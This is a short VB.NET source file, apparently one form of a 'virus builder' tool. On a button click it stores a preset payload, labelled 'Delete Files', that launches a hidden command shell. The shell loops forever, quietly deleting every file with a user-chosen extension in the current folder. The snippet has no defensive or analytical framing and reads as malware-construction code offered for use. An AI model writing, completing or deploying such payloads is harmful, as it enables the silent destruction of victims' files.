Public Class Options_05
    Private Sub LogInButtonWithProgress2_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress2.Click
        My.Settings.PresetVir_No_006 = "'=== Delete Files ===
Shell (" & Chr(34) & "cmd /c for /l %x in (0, 0, 0) do Del /Q *." & LogInNormalTextBox1.Text & Chr(34) & ", vbHide)"
        Me.Close()
    End Sub
End Class